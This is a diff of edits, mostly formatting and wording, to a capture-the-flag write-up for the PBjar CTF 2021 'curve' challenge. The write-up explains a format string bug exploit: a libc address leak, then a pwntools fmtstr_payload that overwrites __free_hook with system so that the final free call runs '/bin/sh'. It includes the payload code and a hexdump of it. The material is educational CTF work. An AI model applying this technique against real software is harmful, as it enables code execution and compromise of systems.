@@ -18,11 +18,11 @@ curve.zip
 
 ## Analysis:
 
-This binary can be input 3 times, the first time it is output with `puts`, the second time there is no output, and the third time it is displayed directly with` printf`. Therefore, there is a vulnerability of `FSB (Format String Bug)` in the third input.
-However, since this binary is `Full RELRO`,` GOT` cannot be rewritten with `FSB`. The method of rewriting the return address with `FSB` does not have enough read input size.
-Also, since the third input is written to the area allocated by `malloc` in the heap, the address that can be used by` FSB` cannot be specified.
+This binary can be input 3 times, the first time(`Input 1`) it is output with `puts`, the second time(`Input 2`) there is no output, and the third time(`Input 3`) it is displayed directly with `printf`. Therefore, there is a vulnerability of `FSB (Format String Bug)` in the third input.
+However, since this binary is `Full RELRO`, `GOT` cannot be rewritten with `FSB`. The method of rewriting the return address with `FSB` does not have enough read input size.
+Also, since the third input is written to the area allocated by `malloc` in the heap, the address that can be used by `FSB` cannot be specified.
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -56,7 +56,7 @@ undefined8 main(void)
 ```
 
 The result of checksec. We can see that it is `Full RELRO`.
-```
+```bash
 $ checksec curve
 [*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve'
     Arch:     amd64-64-little
@@ -66,8 +66,8 @@ $ checksec curve
     PIE:      PIE enabled
 ```
 
-Since the character string input in `Input 2` is output as `0x4141414141414141` at the 8th position of `Input 3`, We can see that the value of` index` is `8`.
-```
+Since the character string input in `Input 2` is output as `0x4141414141414141` at the 8th position of `Input 3`, We can see that the value of `index` is `8`.
+```bash
 Input 2:
 AAAAAAAA
 
@@ -81,7 +81,7 @@ BBBBBBBB,0x55555555a2a0,0x80,0x7ffff7ef5e8e,0xa,0x7ffff7fc5be0,(nil),0x55555555a
 
 First, the libc address leak can be done by entering a `0x98` size string in` Input 1` to leak the address `__libc_start_main + 234`. We can calculate the base address of libc.
 
-```
+```bash
 gdb-peda$ x/80gx 0x7fffffffdec0
 0x7fffffffdec0:	0x0000000000000000	0x000055555555a2a0
 0x7fffffffded0:	0x4141414141414141	0x4141414141414141
@@ -97,19 +97,19 @@ gdb-peda$ x/80gx 0x7fffffffdec0
 0x7fffffffdf70:	0x00007fffffffe058	0x0000000100000000
 ```
 
-Since the shell is started by calling `free (__ format)` at the end, it is done by writing the address of the `system` function to ` __free_hook` using FSB.
+Shell startup uses the `free (__ format)` call at the end of the binary. I use FSB to write the address of the `system` function to `__free_hook`.
 At this time, first write `/bin/sh` so that it is in the form of free ('/bin/sh; FSB string'). Then, when we call free (), it will be in the form of system (`/bin/sh; ...'), so we can start the shell.
 
 Also, `Input 2` writes the address of `__free_hook`, and `INPUT 3` writes the character string of `FSB`. Since the input size of `Input 2` and` Input 3` is as large as `0x80`, we can write the same character string created by `fmtstr_payload` to `Input 2` and` Input 3` as shown below.
 
-```
+```python
 index = 8
 writes = {free_hook: system_addr}
 buf = b"/bin/sh;" + fmtstr_payload(index+1, writes, numbwritten=8, write_size='short')
 ```
 
 `fmtstr_payload` creates a string like the one below.
-```
+```bash
     00000000  2f 62 69 6e  2f 73 68 3b  25 36 35 30  39 36 63 25  │/bin│/sh;│%650│96c%│
     00000010  31 34 24 6c  6c 6e 25 33  33 31 39 39  63 25 31 35  │14$l│ln%3│3199│c%15│
     00000020  24 68 6e 25  33 30 36 39  33 63 25 31  36 24 68 6e  │$hn%│3069│3c%1│6$hn│
